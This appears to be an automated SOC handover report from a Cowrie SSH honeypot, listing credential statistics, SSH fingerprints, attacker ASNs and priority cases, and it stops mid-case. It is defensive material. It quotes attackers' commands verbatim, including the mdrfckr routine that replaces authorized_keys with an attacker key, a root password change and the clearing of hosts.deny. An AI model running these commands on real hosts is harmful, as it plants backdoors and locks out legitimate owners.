# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-14 |
| **Generated At** | 2026-05-14T14:23:59Z |
| **Shift Time** | 14:23 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **139** |
| Confirmed Threats | **112** |
| False Positives Filtered | **27** (19.4%) |
| Unique Attacker IPs | **43** |
| Countries of Origin | **22** |
| High Severity Cases | **19** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **120** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **38** |
| Unique Credential Pairs | **21** |
| Unique Usernames | **10** |
| Unique Passwords | **19** |
| Successful Auth Pairs | **17** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 21 |
| `345gs5662d34` | 9 |
| `wang` | 1 |
| `sonar` | 1 |
| `uftp` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 9 |
| `3245gs5662d34` | 9 |
| `123456` | 4 |
| `ansadmin` | 1 |
| `wang123` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 9 |
| `root` | `3245gs5662d34` | 9 |
| `root` | `123456` | 2 |
| `root` | `ansadmin` | 1 |
| `wang` | `wang123` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `ansadmin` | `20.96.179.87` | 2026-05-14T11:46:34 |
| `root` | `bmw318d123` | `121.229.9.97` | 2026-05-14T12:01:50 |
| `root` | `3245gs5662d34` | `121.229.9.97` | 2026-05-14T12:01:54 |
| `root` | `123Qwe123C` | `45.249.247.165` | 2026-05-14T12:04:15 |
| `root` | `3245gs5662d34` | `45.249.247.165` | 2026-05-14T12:04:18 |
| `root` | `linux123` | `45.249.247.165` | 2026-05-14T12:07:49 |
| `root` | `123@India` | `45.249.247.165` | 2026-05-14T12:09:39 |
| `root` | `Pa$$w0rd` | `202.108.48.228` | 2026-05-14T12:17:24 |
| `root` | `3245gs5662d34` | `202.108.48.228` | 2026-05-14T12:17:28 |
| `root` | `jessica` | `179.33.186.150` | 2026-05-14T12:30:00 |
| `root` | `3245gs5662d34` | `179.33.186.150` | 2026-05-14T12:30:07 |
| `root` | `jira@123` | `181.0.214.136` | 2026-05-14T12:39:34 |
| `root` | `3245gs5662d34` | `181.0.214.136` | 2026-05-14T12:40:02 |
| `root` | `A12345678a` | `51.77.158.34` | 2026-05-14T14:15:25 |
| `root` | `3245gs5662d34` | `51.77.158.34` | 2026-05-14T14:15:29 |
| `root` | `123456789/*` | `103.126.117.26` | 2026-05-14T14:17:14 |
| `root` | `3245gs5662d34` | `103.126.117.26` | 2026-05-14T14:17:16 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **139** |
| Sessions with Fingerprint | **9** |
| Unique HASSH Fingerprints | **9** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 37 |
| Go SSH scanner | 31 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 24 | 7 |
| `0a07365cc01f...` | Generic scanner | 18 | 3 |
| `af8223ac9914...` | libssh-based | 5 | 2 |
| `03a80b21afa8...` | Modern SSH client | 5 | 3 |
| `19532158b559...` | Mirai/variant | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 24 | 7 | Mirai/variant |
| `0a07365cc01f...` | Go SSH scanner | 18 | 3 | Generic scanner |
| `95420f9d932d...` | Go SSH scanner | 11 | 3 | — |
| `af8223ac9914...` | libssh | 5 | 2 | libssh-based |
| `03a80b21afa8...` | libssh | 5 | 3 | Modern SSH client |
| `19532158b559...` | libssh | 2 | 1 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 9 | 7 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:pp6FmZT1KwqV"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `20.96.179.87`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `121.229.9.97`, `51.77.158.34`, `181.0.214.136`, `45.249.247.165`, `103.126.117.26`, `179.33.186.150`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **43** |
| Unique ASNs | **32** |
| High-Risk ASNs | **24** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 3 | HIGH |
| `AS25369` | Hydra Communications Ltd | 3 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | LOW |
| `AS16509` | Amazon.com, Inc. | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS199739` | Earthlink Telecommunications Equipment Trading & Services DMCC | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (19)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-62f271d46e62

| Field | Detail |
|---|---|
| **Source IP** | `20.96.179[.]87` |
| **First Seen** | 2026-05-14 11:45 |
| **Last Seen** | 2026-05-14 11:51 |
| **Session Duration** | 336s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:pp6FmZT1KwqV"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 11:45:58` | `cowrie.session.connect` |
| `2026-05-14 11:45:59` | `cowrie.client.version` |
| `2026-05-14 11:46:00` | `cowrie.client.kex` |
| `2026-05-14 11:46:34` | `cowrie.login.success` |
| `2026-05-14 11:47:08` | `cowrie.session.params` |
| `2026-05-14 11:47:08` | `cowrie.command.input` |
| `2026-05-14 11:47:08` | `cowrie.command.failed` |
| `2026-05-14 11:47:10` | `cowrie.log.closed` |
| `2026-05-14 11:47:21` | `cowrie.session.params` |
| `2026-05-14 11:47:21` | `cowrie.command.input` |
| `2026-05-14 11:47:23` | `cowrie.session.file_download` |
| `2026-05-14 11:47:23` | `cowrie.log.closed` |
| `2026-05-14 11:48:30` | `cowrie.session.params` |
| `2026-05-14 11:48:30` | `cowrie.command.input` |
| `2026-05-14 11:48:39` | `cowrie.log.closed` |
| `2026-05-14 11:48:42` | `cowrie.session.params` |
| `2026-05-14 11:48:42` | `cowrie.command.input` |
| `2026-05-14 11:49:34` | `cowrie.log.closed` |
| `2026-05-14 11:49:51` | `cowrie.session.params` |
| `2026-05-14 11:49:51` | `cowrie.command.input` |
| `2026-05-14 11:49:54` | `cowrie.session.file_download` |
| `2026-05-14 11:49:54` | `cowrie.log.closed` |
| `2026-05-14 11:50:17` | `cowrie.session.params` |
| `2026-05-14 11:50:17` | `cowrie.command.input` |
| `2026-05-14 11:50:28` | `cowrie.log.closed` |
| `2026-05-14 11:50:31` | `cowrie.session.params` |
| `2026-05-14 11:50:31` | `cowrie.command.input` |
| `2026-05-14 11:50:56` | `cowrie.log.closed` |
| `2026-05-14 11:51:18` | `cowrie.session.params` |
| `2026-05-14 11:51:18` | `cowrie.command.input` |
| `2026-05-14 11:51:18` | `cowrie.command.input` |
| `2026-05-14 11:51:20` | `cowrie.log.closed` |
| `2026-05-14 11:51:31` | `cowrie.session.params` |
| `2026-05-14 11:51:31` | `cowrie.command.input` |
| `2026-05-14 11:51:34` | `cowrie.log.closed` |
| `2026-05-14 11:51:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.96.179[.]87` to AbuseIPDB if not already reported
- [ ] Block `20.96.179[.]87` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f588189eeee

| Field | Detail |
|---|---|
| **Source IP** | `121.229.9[.]97` |
| **First Seen** | 2026-05-14 12:01 |
| **Last Seen** | 2026-05-14 12:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 12:01:49` | `cowrie.session.connect` |
| `2026-05-14 12:01:49` | `cowrie.client.version` |
| `2026-05-14 12:01:49` | `cowrie.client.kex` |
| `2026-05-14 12:01:50` | `cowrie.login.success` |
| `2026-05-14 12:01:50` | `cowrie.session.params` |
| `2026-05-14 12:01:50` | `cowrie.command.input` |
| `2026-05-14 12:01:50` | `cowrie.command.failed` |
| `2026-05-14 12:01:50` | `cowrie.log.closed` |
| `2026-05-14 12:01:51` | `cowrie.session.params` |
| `2026-05-14 12:01:51` | `cowrie.command.input` |
| `2026-05-14 12:01:51` | `cowrie.session.file_download` |
| `2026-05-14 12:01:51` | `cowrie.log.closed` |
| `2026-05-14 12:01:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.229.9[.]97` to AbuseIPDB if not already reported
- [ ] Block `121.229.9[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a3a00f225ef

| Field | Detail |
|---|---|
| **Source IP** | `121.229.9[.]97` |
| **First Seen** | 2026-05-14 12:01 |
| **Last Seen** | 2026-05-14 12:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 12:01:53` | `cowrie.session.connect` |
| `2026-05-14 12:01:53` | `cowrie.client.version` |
| `2026-05-14 12:01:53` | `cowrie.client.kex` |
| `2026-05-14 12:01:54` | `cowrie.login.success` |
| `2026-05-14 12:01:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.229.9[.]97` to AbuseIPDB if not already reported
- [ ] Block `121.229.9[.]97` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fdde097df5b

| Field | Detail |
|---|---|
| **Source IP** | `45.249.247[.]165` |
| **First Seen** | 2026-05-14 12:04 |
| **Last Seen** | 2026-05-14 12:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 12:04:15` | `cowrie.session.connect` |
| `2026-05-14 12:04:15` | `cowrie.client.version` |
| `2026-05-14 12:04:15` | `cowrie.client.kex` |
| `2026-05-14 12:04:15` | `cowrie.login.success` |
| `2026-05-14 12:04:16` | `cowrie.session.params` |
| `2026-05-14 12:04:16` | `cowrie.command.input` |
| `2026-05-14 12:04:16` | `cowrie.command.failed` |
| `2026-05-14 12:04:16` | `cowrie.log.closed` |
| `2026-05-14 12:04:16` | `cowrie.session.params` |
| `2026-05-14 12:04:16` | `cowrie.command.input` |
| `2026-05-14 12:04:16` | `cowrie.session.file_download` |
| `2026-05-14 12:04:16` | `cowrie.log.closed` |
| `2026-05-14 12:04:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.249.247[.]165` to AbuseIPDB if not already reported
- [ ] Block `45.249.247[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59d10640bc95

| Field | Detail |
|---|---|
| **Source IP** | `45.249.247[.]165` |
| **First Seen** | 2026-05-14 12:04 |
| **Last Seen** | 2026-05-14 12:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 12:04:18` | `cowrie.session.connect` |
| `2026-05-14 12:04:18` | `cowrie.client.version` |
| `2026-05-14 12:04:18` | `cowrie.client.kex` |
| `2026-05-14 12:04:18` | `cowrie.login.success` |
| `2026-05-14 12:04:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.249.247[.]165` to AbuseIPDB if not already reported
- [ ] Block `45.249.247[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd0f5acc5c51

| Field | Detail |
|---|---|
| **Source IP** | `45.249.247[.]165` |
| **First Seen** | 2026-05-14 12:07 |
| **Last Seen** | 2026-05-14 12:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 12:07:49` | `cowrie.session.connect` |
| `2026-05-14 12:07:49` | `cowrie.client.version` |
| `2026-05-14 12:07:49` | `cowrie.client.kex` |
| `2026-05-14 12:07:49` | `cowrie.login.success` |
| `2026-05-14 12:07:50` | `cowrie.session.params` |
| `2026-05-14 12:07:50` | `cowrie.command.input` |
| `2026-05-14 12:07:50` | `cowrie.command.failed` |
| `2026-05-14 12:07:50` | `cowrie.log.closed` |
| `2026-05-14 12:07:50` | `cowrie.session.params` |
| `2026-05-14 12:07:50` | `cowrie.command.input` |
| `2026-05-14 12:07:50` | `cowrie.session.file_download` |
| `2026-05-14 12:07:50` | `cowrie.log.closed` |
| `2026-05-14 12:07:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.249.247[.]165` to AbuseIPDB if not already reported
- [ ] Block `45.249.247[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f15c2e3df00

| Field | Detail |
|---|---|
| **Source IP** | `45.249.247[.]165` |
| **First Seen** | 2026-05-14 12:07 |
| **Last Seen** | 2026-05-14 12:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 12:07:52` | `cowrie.session.connect` |
| `2026-05-14 12:07:52` | `cowrie.client.version` |
| `2026-05-14 12:07:52` | `cowrie.client.kex` |
| `2026-05-14 12:07:53` | `cowrie.login.success` |
| `2026-05-14 12:07:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.249.247[.]165` to AbuseIPDB if not already reported
- [ ] Block `45.249.247[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e35c1dbc66fb

| Field | Detail |
|---|---|
| **Source IP** | `45.249.247[.]165` |
| **First Seen** | 2026-05-14 12:09 |
| **Last Seen** | 2026-05-14 12:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 12:09:39` | `cowrie.session.connect` |
| `2026-05-14 12:09:39` | `cowrie.client.version` |
| `2026-05-14 12:09:39` | `cowrie.client.kex` |
| `2026-05-14 12:09:39` | `cowrie.login.success` |
| `2026-05-14 12:09:39` | `cowrie.session.params` |
| `2026-05-14 12:09:39` | `cowrie.command.input` |
| `2026-05-14 12:09:39` | `cowrie.command.failed` |
| `2026-05-14 12:09:40` | `cowrie.log.closed` |
| `2026-05-14 12:09:40` | `cowrie.session.params` |
| `2026-05-14 12:09:40` | `cowrie.command.input` |
| `2026-05-14 12:09:40` | `cowrie.session.file_download` |
| `2026-05-14 12:09:40` | `cowrie.log.closed` |
| `2026-05-14 12:09:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.249.247[.]165` to AbuseIPDB if not already reported
- [ ] Block `45.249.247[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a04f2c6f835d

| Field | Detail |
|---|---|
| **Source IP** | `45.249.247[.]165` |
| **First Seen** | 2026-05-14 12:09 |
| **Last Seen** | 2026-05-14 12:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 12:09:42` | `cowrie.session.connect` |
| `2026-05-14 12:09:42` | `cowrie.client.version` |
| `2026-05-14 12:09:42` | `cowrie.client.kex` |
| `2026-05-14 12:09:42` | `cowrie.login.success` |
| `2026-05-14 12:09:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.249.247[.]165` to AbuseIPDB if not already reported
- [ ] Block `45.249.247[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6599360c8b9b

| Field | Detail |
|---|---|
| **Source IP** | `202.108.48[.]228` |
| **First Seen** | 2026-05-14 12:17 |
| **Last Seen** | 2026-05-14 12:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 12:17:23` | `cowrie.session.connect` |
| `2026-05-14 12:17:23` | `cowrie.client.version` |
| `2026-05-14 12:17:24` | `cowrie.client.kex` |
| `2026-05-14 12:17:24` | `cowrie.login.success` |
| `2026-05-14 12:17:24` | `cowrie.session.params` |
| `2026-05-14 12:17:24` | `cowrie.command.input` |
| `2026-05-14 12:17:24` | `cowrie.command.failed` |
| `2026-05-14 12:17:25` | `cowrie.log.closed` |
| `2026-05-14 12:17:25` | `cowrie.session.params` |
| `2026-05-14 12:17:25` | `cowrie.command.input` |
| `2026-05-14 12:17:25` | `cowrie.session.file_download` |
| `2026-05-14 12:17:25` | `cowrie.log.closed` |
| `2026-05-14 12:17:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.108.48[.]228` to AbuseIPDB if not already reported
- [ ] Block `202.108.48[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f66f39421018

| Field | Detail |
|---|---|
| **Source IP** | `202.108.48[.]228` |
| **First Seen** | 2026-05-14 12:17 |
| **Last Seen** | 2026-05-14 12:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
